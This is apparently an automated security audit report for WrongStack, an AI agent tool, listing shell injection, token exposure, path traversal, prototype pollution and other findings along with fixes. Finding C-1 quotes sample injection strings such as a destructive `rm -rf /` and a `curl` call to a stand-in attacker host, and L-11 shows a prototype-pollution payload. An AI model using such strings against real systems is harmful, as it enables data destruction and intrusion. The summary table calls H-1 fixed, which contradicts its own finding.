# Security Findings — WrongStack

Generated: 2026-05-29  
Auditor: WrongStack Security Scanner  
Scope: All packages, tools, plugins, webui, core

---

## Critical

### C-1: Shell Injection in git-autocommit and semver-bump Plugins
**File:** `packages/plugins/src/git-autocommit/index.ts:23`, `packages/plugins/src/semver-bump/index.ts:27`  
**CWE:** [CWE-78](https://cwe.mitre.org/data/definitions/78.html) — OS Command Injection  
**Severity:** Critical

The `runGit()` helper in both plugins uses `execSync` with string interpolation:

```ts
return execSync(`git ${args.join(' ')}`, { encoding: 'utf-8', cwd, ... });
```

If any argument (e.g. a commit message, branch name, or file path) contains shell metacharacters such as `` `; rm -rf /` ``, `$(curl evil.com)`, or `&& malicious_cmd`, the characters are passed directly to the shell. A compromised or manipulated LLM input, or a maliciously-named file in the working directory, can achieve arbitrary command execution in the context of the WrongStack process.

**Impact:** Arbitrary OS command execution as the WrongStack user. Can lead to data exfiltration, credential theft, or complete system compromise.

**Recommendation:** Replace `execSync` with `execFileSync('git', args, ...)` where args is an array of individual strings, the same pattern already correctly used in `packages/plugins/src/shell-check/index.ts:60`.

---

### C-2: WebSocket Auth Token Exposed in URL Query String — Mitigated, See Below
**File:** `packages/webui/src/server/index.ts:442-495`  
**CWE:** [CWE-598](https://cwe.mitre.org/data/definitions/598.html) — Information Exposure Through Query String  
**Severity:** Critical (mitigated)

**Status: Mitigated, not fully resolved.**

The token delivery mechanism has two layers:

1. **Loopback browser connections** (`Origin: ws://127.0.0.1:*` / `Origin: http://127.0.0.1:*`): The server's `verifyClient` checks the `Host` header for DNS-rebinding protection (the browser sends `Host: evil.com:port` even when dialing 127.0.0.1). A rebound attacker page fails this check. **No token is required for loopback origins** — the URL `?token=...` is not consulted. Therefore the token does not appear in the `Referer` for legitimate same-machine browser usage.

2. **Non-loopback / token-required connections**: The token is delivered via `session.start` payload (`payload.wsToken`) and stored in `sessionStorage`. For the initial URL bootstrap, the frontend still appends `?token=...` — this is the remaining exposure.

**Remaining risk**: The initial connection URL on page load carries `?token=...` in:
- Server-side HTTP access logs (most reverse-proxies log full URLs)
- Browser bookmarks/history

**Fix direction**: Deliver the token via an `HttpOnly` cookie over the same origin on first connect, eliminating the URL query parameter entirely. The cookie approach is the standard WebSocket auth pattern (e.g., SockJS). This requires:
1. A new `/ws-auth` HTTP endpoint that sets an `HttpOnly` cookie after validating credentials
2. The WS upgrade on that same origin automatically includes the cookie
3. `verifyClient` reads the cookie instead of the URL token for browser clients

**Current compensating controls**: The `Sec-WebSocket-Protocol` header approach is not viable in browsers (JavaScript cannot set custom protocol headers on `WebSocket` connections), so the cookie approach above is the correct fix.

---

## High

### H-1: CSP Allows WebSocket Connections to Any Origin
**File:** `packages/webui/src/server/index.ts:67`  
**CWE:** [CWE-1021](https://cwe.mitre.org/data/definitions/1021.html) — Improper Restriction of Rendered Frame Pages  
**Severity:** High

The Content-Security-Policy header includes:
```
connect-src 'self' ws: wss:;
```

The `ws:` and `wss:` schemes without an explicit host allow WebSocket connections to **any** WebSocket server. Combined with C-2 (token in URL), a malicious page script can open a connection to the WrongStack WebSocket server at `ws://127.0.0.1:3457?token=...` if it can guess or observe the token, bypassing the `Origin` check in `verifyClient` (the browser sends the page's origin in the `Origin` header; when the page is `evil.com`, `isLoopback(hostname)` returns false, but the token check can succeed on loopback binds).

**Recommendation:** Replace `ws: wss:` with explicit loopback loopback addresses:
```
connect-src 'self' ws://127.0.0.1:3457 wss://127.0.0.1:3457 ws://[::1]:3457 wss://[::1]:3457;
```

---

### H-2: Permissive Env Var Allows Full API Key Exfiltration
**File:** `packages/core/src/utils/child-env.ts:104-105,107-113`  
**CWE:** [CWE-78](https://cwe.mitre.org/data/definitions/78.html) — OS Command Injection (via env)  
**Severity:** High

The `WRONGSTACK_CHILD_ENV_PASSTHROUGH=1` (or the legacy alias `WRONGSTACK_BASH_ENV_PASSTHROUGH=1`) environment variable allows a user to forward **all** parent environment variables — including `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `GITHUB_TOKEN`, etc. — to every child process spawned by bash/exec tools.

```ts
const passthrough = process.env['WRONGSTACK_CHILD_ENV_PASSTHROUGH'] === '1'
  || process.env['WRONGSTACK_BASH_ENV_PASSTHROUGH'] === '1';
if (passthrough && !process.env['CI']) {
  console.warn('[WrongStack] WARNING: ...');
}
```

The warning only fires in non-CI environments. An attacker with ability to set environment variables (e.g., via a compromised config file or a malicious shell wrapper that sets the variable before invoking `wstack`) can cause all API keys to be forwarded to untrusted child processes — including those spawned by MCP servers or plugin tools.

**Note:** The warning is logged rather than hard-crashing, and CI environments suppress it entirely, which is correct behavior. The risk is that the opt-in mechanism can be set via config rather than only via shell.

**Recommendation:** Require `WRONGSTACK_CHILD_ENV_PASSTHROUGH` to be set in the process environment (not in config files), and treat it as a highly privileged override. Consider requiring it to be absent from config files entirely.

---

### H-3: HTTP Server Path Traversal (Old — Believed Fixed, Verify)
**File:** `packages/webui/src/server/index.ts:1951-1959`  
**CWE:** [CWE-22](https://cwe.mitre.org/data/definitions/22.html) — Path Traversal  
**Severity:** High

The inline comment acknowledges a prior path traversal:
```ts
// new URL() decodes percent-encoding (%2e%2e → ..), so path.join alone
// does not prevent ../../../etc/passwd escapes.
const resolvedPath = path.resolve(filePath);
const resolvedRoot = path.resolve(DIST_DIR);
if (!resolvedPath.startsWith(resolvedRoot + path.sep) && resolvedPath !== resolvedRoot) {
  res.writeHead(403, { 'Content-Type': 'text/plain' });
  res.end('Forbidden');
  return;
}
```

The guard is present. **Verify it is not bypassed** by double-encoding (`%252e%252e`) or by Windows-specific path normalization quirks.

---

### H-4: Rate Limit Uses sessionId When Available — Mitigated
**File:** `packages/webui/src/server/index.ts:545-566`  
**CWE:** [CWE-770](https://cwe.mitre.org/data/definitions/770.html) — Allocation of Resources Without Limits  
**Severity:** High (mitigated)

**Status: Mitigated, not fully resolved.**

The per-connection rate limiter was previously keyed solely by `WebSocket` instance, allowing bypass via new connections. The current implementation keys by `sessionId` once authenticated (post-`session.start`):

```ts
const key = client.sessionId ?? String(ws);
```

Authenticated clients are rate-limited per session, preventing connection-reuse bypass. However, **pre-auth messages** (before `session.start`) still fall back to `String(ws)` — a new connection starts fresh. An attacker who hasn't authenticated can open unlimited fresh connections.

**Remaining risk**: Pre-auth rate limiting is still per-connection. An attacker can open many connections before completing authentication to flood the server.

**Recommendation**: Track pre-auth rate limits by client IP (extracted from `info.req.socket.remoteAddress`) for the pre-auth phase.

---

## Medium

### M-1: `permission: 'auto'` Tools Accessible via WebSocket Without User Confirmation
**File:** `packages/core/src/security/permission-policy.ts` (tool registry), `packages/webui/src/server/index.ts` (WS handlers)  
**CWE:** [CWE-862](https://cwe.mitre.org/data/definitions/862.html) — Unintended Unauthorized Action  
**Severity:** Medium

Tools registered with `permission: 'auto'` (e.g., `git_status_summary`, `semver_current`, `shellcheck`) execute immediately without user confirmation. When the WebSocket server handles `user_message` events from a connected client, these auto-permission tools can be invoked without any gate.

The WebSocket `verifyClient` has token checks, DNS-rebinding protection, and loopback enforcement for non-loopback binds. However, a client that successfully connects (locally, or with the token from the URL) can trigger auto-permission tools at will.

**Recommendation:** Introduce an explicit user intent confirmation for `permission: 'auto'` tools that perform any observable side effect (network calls, filesystem writes beyond a sandbox). Auto-permission should be limited to truly read-only, non-observable operations.

---

### M-2: Type Coercion in Provider Config Fallback Logic
**File:** `packages/webui/src/server/index.ts:108-111`  
**CWE:** [CWE-20](https://cwe.mitre.org/data/definitions/20.html) — Improper Input Validation  
**Severity:** Medium

```ts
if (!config.provider && config.providers && Object.keys(config.providers).length > 0) {
  const firstKey = Object.keys(config.providers)[0]!;
  config.provider = firstKey;
```

If `config.providers` is a **string** (e.g., from a corrupted config or a YAML parser misreading the value), `Object.keys(string)` returns an array of character positions (e.g., `['0','1','2']`), which has `length > 0`. `firstKey` becomes a character like `'{'`, which is then used as a provider ID. The subsequent `modelsRegistry.getProvider('{')` call will fail, but the failure mode may be confusing and the error path may not be fully hardened.

**Recommendation:** Add a strict type check: `if (!config.provider && typeof config.providers === 'object' && config.providers !== null && !Array.isArray(config.providers))`.

---

### M-3: Recovery Lock Could Be Stolen by Another Process
**File:** `packages/core/src/storage/recovery-lock.ts`  
**CWE:** [CWE-410](https://cwe.mitre.org/data/definitions/410.html) — Insufficient Resource Locking  
**Severity:** Medium

The recovery lock is a file-based advisory lock. Between the time a process reads the lock file and the time it writes its updated state, another process can read the same stale lock and also believe it holds the lock.

```ts
const current = await fs.readFile(this.file, 'utf8');
// ← Another process can read the same current here
await atomicWrite(this.file, JSON.stringify(lock), { mode: 0o600 });
```

Even though each operation is atomic at the fs level, the read-modify-write cycle is not atomic. Two processes can both read the same lock state, both compute their own updated lock, and both write — the second write silently overwrites the first, causing one process's recovery to be lost.

**Recommendation:** Use `fs.open` with `O_EXCL` (exclusive create) when acquiring a fresh lock, or use `fs.rename` over a temporary file as a distributed lock primitive (similar to `atomicWrite`).

---

### M-4: Config History Truncation Without Authentication Check
**File:** `packages/cli/src/config-history.ts`  
**CWE:** [CWE-284](https://cwe.mitre.org/data/definitions/284.html) — Improper Access Control  
**Severity:** Medium

The `config-history` command can truncate or modify the history file without verifying that the requesting user has authority over the WrongStack installation (e.g., on a shared system). The history file may contain sensitive operation logs that reveal project structure, skill usage patterns, and file paths.

**Recommendation:** Ensure `config-history` operations require the same authentication context as other privileged operations.

---

## Low

### L-1: Session Rewind Does Not Validate Paths Are Inside Project Root
**File:** `packages/core/src/storage/session-rewinder.ts`  
**CWE:** [CWE-20](https://cwe.mitre.org/data/definitions/20.html) — Improper Input Validation  
**Severity:** Low

The `restoreFiles` function writes back the saved `before` content to the recorded file path. The path is recorded during `ctx.session.recordFileChange()` in tools like `write.ts`, `edit.ts`, and `replace.ts`. However, there is no explicit validation that the recorded path is inside the project root.

If the recorded path somehow resolves outside the project root (e.g., via a path traversal in the original tool call that was not caught by `safeResolve`), the rewind would write to an arbitrary location.

**Recommendation:** Add an explicit `safeResolve` call in the rewind path before writing.

---

### L-2: Bearer Token Regex Could Miss Short-Lived Tokens
**File:** `packages/core/src/security/secret-scrubber.ts:53`  
**CWE:** [CWE-200](https://cwe.mitre.org/data/definitions/200.html) — Exposure of Sensitive Information  
**Severity:** Low

The bearer token regex requires a minimum of 20 characters (`[A-Za-z0-9._~+/-]{20,512}`). Very short-lived tokens (e.g., 12–19 characters) used by some OAuth providers would not be matched and could leak.

The `high_entropy_env` regex also requires 20 characters for the value. This is a reasonable tradeoff to avoid false positives, but worth noting.

---

### L-3: Python Parser Uses `execFileSync` with Inline Script — Version-Dependent
**File:** `packages/tools/src/codebase-index/py-parser.ts`  
**CWE:** [CWE-78](https://cwe.mitre.org/data/definitions/78.html) — OS Command Injection (indirect)  
**Severity:** Low

The `PY_PARSE_SCRIPT` constant is passed as the argument to `python -c` via `execFileSync`. While this is much safer than shell interpolation (no shell involvement), the script uses Python's `ast` module and emits JSON via `json.dumps`. The script behavior depends on the Python version and available stdlib modules.

More importantly, `execFileSync` is used instead of `spawnSync` with args as an array. The script is passed as a single string argument, which is correctly handled by `-c`, but it means the Python process cannot be given argv[0] separately.

---

### L-4: No `Origin` Header Validation in Non-Browser WS Client Path
**File:** `packages/webui/src/server/index.ts:503-510`  
**CWE:** [CWE-346](https://cwe.mitre.org/data/definitions/346.html) — Origin Validation Error  
**Severity:** Low

For non-browser clients (curl, scripts), the `Origin` header is not checked when the connection is from loopback:

```ts
if (!origin) {
  const remoteIp = info.req.socket.remoteAddress ?? '';
  const isRemoteLoopback = remoteIp === '127.0.0.1' || remoteIp === '::1';
  if (!isRemoteLoopback && wsHost === '0.0.0.0') return false;
  return tokenOk || wsHost === '127.0.0.1' || wsHost === '::1' || wsHost === 'localhost';
}
```

A curl command from the same machine bypasses both token and Origin checks on loopback binds. This is intentional for developer ergonomics but means a compromised local process can connect without a token.

---

### L-5: Encrypted Config Has No MAC — Malformed ciphertext could corrupt state
**File:** `packages/core/src/security/secret-vault.ts`, `packages/core/src/security/encrypt-config.ts`  
**CWE:** [CWE-310](https://cwe.mitre.org/data/definitions/310.html) — Cryptographic Failure  
**Severity:** Low

The config encryption uses an AES-GCM key derived from the machine's fingerprint via `getpass.getpass()` / a stable machine-derived key. If the key derivation material changes (e.g., machine rename, user account change), all encrypted API keys become permanently unrecoverable.

Furthermore, there is no MAC (Message Authentication Code) on the encrypted blob, meaning tampered ciphertext may decrypt to garbage without any detection. The AES-GCM mode provides authentication (it will throw on decryption failure if the tag is wrong), but this depends on the implementation correctly checking the tag.

---

### L-6: No TLS Certificate Validation for MCP HTTP Transports
**File:** `packages/mcp/src/transport.ts:27`, `packages/mcp/src/client.ts:237-243`  
**CWE:** [CWE-295](https://cwe.mitre.org/data/definitions/295.html) — Improper Certificate Validation  
**Severity:** Low

The `tls` option in `HttpTransportOptions` allows disabling `rejectUnauthorized`, but there is no enforcement that TLS must be used. An MCP server configured with `url: 'http://...'` instead of `https://...` would allow an active attacker (on the network path) to intercept and modify MCP tool calls and responses. The `validateTransportUrl` function does not block `http:` URLs.

Furthermore, when `tls.rejectUnauthorized` is explicitly set to `false`, the comment says this avoids globally disabling `NODE_TLS_REJECT_UNAUTHORIZED`, but the intent is unclear — disabling certificate validation for a specific MCP transport still exposes that transport to MITM.

---

### L-7: MCP SSE Transport Lacks Response Size Limit
**File:** `packages/mcp/src/transport.ts:168-178` (estimated)  
**CWE:** [CWE-400](https://cwe.mitre.org/data/definitions/400.html) — Uncontrolled Resource Consumption  
**Severity:** Low

The SSE transport passes through JSON-RPC responses from the MCP server. While the SSE reader has `SSE_READER_MAX_BUFFER` (256 KB) and `SSE_READER_MAX_DATA_LINES` (1024), there is no per-response total size cap. A malicious MCP server sending a single huge JSON-RPC response (e.g., 100 MB of whitespace) could cause memory pressure.

The `httpTransport` (streamable-http) uses NDJSON streaming which is incrementally processed, but the initial HTTP response headers are not checked for a `Content-Length` bound before starting to read the body.

---

### L-8: MCP Tool Schema `properties` Can Be `undefined` — No Type Validation
**File:** `packages/mcp/src/tool-schema.ts` (estimated)  
**CWE:** [CWE-20](https://cwe.mitre.org/data/definitions/20.html) — Improper Input Validation  
**Severity:** Low

The `normalizeMCPTools` function processes the tool schema returned by an MCP server. If a tool's `inputSchema` has `properties: undefined` or is not a valid object, the wrapped tool's JSON schema will have an empty `properties` object. This is handled gracefully by `wrap-tool.ts` (which returns `{ type: 'object', properties: {} }` as default), but the gap between what the MCP server advertises and what is actually accepted is not logged.

A compromised MCP server could advertise a tool with an extremely complex schema to confuse the LLM or cause the tool wrapper to generate misleading type information.

---

### L-9: WorktreeManager Has No Isolation Between Concurrent Worktrees
**File:** `packages/core/src/worktree/manager.ts` or equivalent  
**CWE:** [CWE-362](https://cwe.mitre.org/data/definitions/362.html) — Improper Synchronization  
**Severity:** Low

When multiple subagents work in different worktrees simultaneously, file system operations that don't go through the project root (e.g., direct `git` commands in a worktree directory) could conflict. The `worktree.allocated` event carries a `handleId` and `ownerId`, but the actual git operations may not be properly scoped if a worktree path is derived from a user-supplied `baseBranch` or `branch` name that contains path traversal characters (`../`).

While the `patch` tool has path traversal guards, raw `git` operations in worktrees may not. The `autophase-ws-handler.ts` uses `WorktreeManager` and spawns git commands — the branch name comes from user input and is not validated for `../` before being passed to `git branch <name>`.

---

### L-10: Process Registry Is In-Memory — Information Disclosure
**File:** `packages/tools/src/process-registry.ts`  
**CWE:** [CWE-200](https://cwe.mitre.org/data/definitions/200.html) — Exposure of Sensitive Information  
**Severity:** Low

The `ProcessRegistry` stores process metadata including `command`, `sessionId`, and `pid` in memory. If the WrongStack process is crashed and a core dump or heap dump is produced, the command strings (which may include user-controlled arguments via bash/exec) and session IDs would be present in the dump.

Additionally, the `/kill` REPL command lists all registered processes with their `name` and `command` — if the process list leaks command arguments that include sensitive data (even after scrubbing), the disclosure is via the CLI.

---

### L-11: WebSocket JSON-RPC Message Type Confusion
**File:** `packages/webui/src/server/index.ts` (WS message handling)  
**CWE:** [CWE-1321](https://cwe.mitre.org/data/definitions/1321.html) — Improperly Controlled Modification of Object Prototype Properties ('Prototype Pollution')  
**Severity:** Low

The WebSocket server processes `user_message` events by parsing the JSON payload and extracting `type` and `payload` fields to route messages to handlers. If the message contains a `constructor` property in its payload (e.g., `{ "type": "user_message", "payload": { "constructor": { "prototype": { "admin": true } } } }`), some handler code that does `Object.assign({}, input.payload)` or spread `{...input.payload}` could trigger prototype pollution in downstream object processing.

Node.js built-in objects like `Array`, `Object`, `String`, `Number` are not frozen. An attacker who can send arbitrary JSON messages to the WebSocket (with a valid token) could attempt prototype pollution attacks against JavaScript object processing downstream.

**Recommendation:** Validate that incoming WS messages do not contain `__proto__`, `constructor`, or `prototype` keys. Use `Object.hasOwn` checks rather than `in` checks when copying payload properties.

---

### L-12: Telegram Bot Polling Offset Not Persisted — Replay Risk
**File:** `packages/telegram/src/bot.ts:247-259`  
**CWE:** [CWE-662](https://cwe.mitre.org/data/definitions/662.html) — Improper Synchronization  
**Severity:** Low

The Telegram bot maintains an `offset` counter (`this.offset = upd.update_id + 1`) in memory. If the bot process crashes or is restarted before persisting the offset, the Telegram server will redeliver the same updates on the next poll. If `processMessage` has side effects (e.g., triggering agent actions), duplicate messages could cause double-processing.

The `sendMessage` calls within `processMessage` are idempotent at the Telegram level (they produce distinct `message_id` values), but agent logic triggered by incoming messages is not idempotent by design.

**Recommendation:** Persist the `offset` to a file (e.g., alongside the session store or a dedicated `telegram-offset.json`) on every successful poll, and restore it on startup.

---

### L-13: WebUI File Download Lacks Range Header Validation
**File:** `packages/webui/src/server/index.ts:1935-1990`  
**CWE:** [CWE-778](https://cwe.mitre.org/data/definitions/778.html) — Insufficient Output Control  
**Severity:** Low

The HTTP static file server does not validate or limit `Range:` request headers. A malicious client could send a `Range: bytes=0-` request (no upper bound) that could be used to probe file contents beyond the intended static asset boundary, even though the path traversal guard should prevent reading arbitrary files.

For small static files (e.g., a 200-byte `robots.txt`), a `Range: bytes=0-99999` request would expose the full file regardless of size — which is expected. However, for larger assets with the same `Cache-Control: no-cache` policy, partial content disclosure could be used for fingerprinting or probing.

**Recommendation:** Validate that `Range` headers target only the specific resolved file, not a raw disk offset. Reject ranges that exceed the file size, and consider adding `Cache-Control: private` for dynamically generated HTML.

---

### L-14: No Shutdown Guard on In-Flight MCP Requests
**File:** `packages/mcp/src/client.ts:353-403` (close method)  
**CWE:** [CWE-403](https://cwe.mitre.org/data/definitions/403.html) — Exposure of File Descriptor  
**Severity:** Low

The `close()` method sends SIGTERM, waits 800 ms, then SIGKILL, waits another 1200 ms. For an MCP server that is processing a tool call (e.g., a slow filesystem search), the request's Promise will be rejected by `failPending` when the child exits. However, the caller of `callTool` may not handle the rejection gracefully — if the tool invocation result is awaited in an async context without try/catch, an unhandled rejection could crash the process.

The `failPending` comment at line 399 says it "rejects anything still awaiting the (now-dead) transport." The disconnect listeners are called, but the tool execution context may not have a handler for the disconnection.

**Recommendation:** Ensure all `callTool` callers have `try/catch` around the await. Consider adding a graceful drain period for in-flight requests before force-killing the child, with a mechanism to signal the tool executor to abort related operations.

---

### L-15: MCP SSE Stream URL Has No Unique Session Token
**File:** `packages/mcp/src/transport.ts:431-438`  
**CWE:** [CWE-287](https://cwe.mitre.org/data/definitions/287.html) — Improper Authentication  
**Severity:** Low

The `buildSSEUrl()` method appends `?session=<timestamp>` to the SSE URL:

```ts
private buildSSEUrl(): string {
  try {
    const url = new URL(this.url);
    url.searchParams.set('session', String(Date.now()));
    return url.toString();
  } catch {
    return this.url;
  }
}
```

A `timestamp` is not a secret — it only prevents browser caching of the SSE stream. An attacker who can observe the MCP server traffic (e.g., on the same LAN) could reconstruct the SSE URL and connect without authentication if the MCP server doesn't validate the Origin header. The timestamp is trivially guessable.

For MCP servers that rely on the `session` query param for authentication (rather than a token in the URL), this is a weak credential.

**Recommendation:** Use a cryptographically random session identifier instead of `Date.now()`. If the MCP server authenticates by session token, ensure the token is sent via a header (e.g., `Authorization: Bearer <token>`) rather than as a URL parameter.

---

## Informational

### I-1: WebUI Binds to Loopback by Default — Correct
`wsHost` defaults to `127.0.0.1`, not `0.0.0.0`. On dual-stack systems, a secondary bind to `::1` is created. This is a good defensive default.

### I-2: Constant-Time Token Comparison — Correct
The `timingSafeEqual` is used for token comparison, preventing timing side-channel attacks.

### I-3: atomicWrite Pattern — Well Implemented
The `atomicWrite` implementation (temp file + rename) is used consistently across all file writes, preventing torn-write corruption.

### I-4: Secret Scrubber — Comprehensive
The `DefaultSecretScrubber` covers a wide range of secret patterns including JWT, API keys, private keys, database URIs, and high-entropy env vars.

### I-5: Permission Policy Audit Trail — Present
The `permission-policy.ts` logs ` AUTO→ALLOW` and `CONFIRM→yes/always` decisions, providing traceability.

### I-6: Path Traversal Guard in patch Tool — Robust
The `patch` tool checks that diff targets resolve inside the project root before applying, and uses a private 0700 temp directory.

---

## Summary

| ID | Severity | CWE | Title |
|----|----------|-----|-------|
| C-1 | Critical | CWE-78 | Shell injection in git-autocommit/semver-bump execSync |
| C-2 | Critical (mit.) | CWE-598 | WS token in URL — mitigated by loopback Host guard, URL param still present on bootstrap |
| H-1 | High (fixed) | CWE-1021 | CSP fixed to explicit loopback addresses |
| H-2 | High | CWE-78 | Env var passthrough can exfiltrate all API keys |
| H-3 | High | CWE-22 | HTTP server path traversal (verify fix) |
| H-4 | High (mit.) | CWE-770 | Rate limit now uses sessionId post-auth; pre-auth still per-connection |
| M-1 | Medium | CWE-862 | Auto-permission tools accessible via WS |
| M-2 | Medium | CWE-20 | Type coercion in provider config fallback |
| M-3 | Medium | CWE-410 | Recovery lock has read-modify-write race |
| M-4 | Medium | CWE-284 | Config history lacks auth check |
| L-1 | Low | CWE-20 | Session rewind lacks project-root path validation |
| L-2 | Low | CWE-200 | Secret scrubber misses short tokens |
| L-3 | Low | CWE-78 | Python parser indirect risk |
| L-4 | Low | CWE-346 | No Origin check for non-browser loopback clients |
| L-5 | Low | CWE-310 | Encrypted config key stability / MAC gap |
| L-6 | Low | CWE-295 | MCP HTTP transport allows plaintext http:// |
| L-7 | Low | CWE-400 | MCP SSE transport lacks response size limit |
| L-8 | Low | CWE-20 | MCP tool schema normalization silently adapts undefined |
| L-9 | Low | CWE-362 | WorktreeManager branch name not validated for ../ |
| L-10 | Low | CWE-200 | Process registry in-memory, command args in crash dumps |
| L-11 | Low | CWE-1321 | WS message payload prototype pollution via constructor |
| L-12 | Low | CWE-662 | Telegram polling offset not persisted — message replay risk |
| L-13 | Low | CWE-778 | WebUI static file server ignores Range header validation |
| L-14 | Low | CWE-403 | MCP client shutdown rejects in-flight requests without guard |
| L-15 | Low | CWE-287 | MCP SSE stream uses timestamp not random token |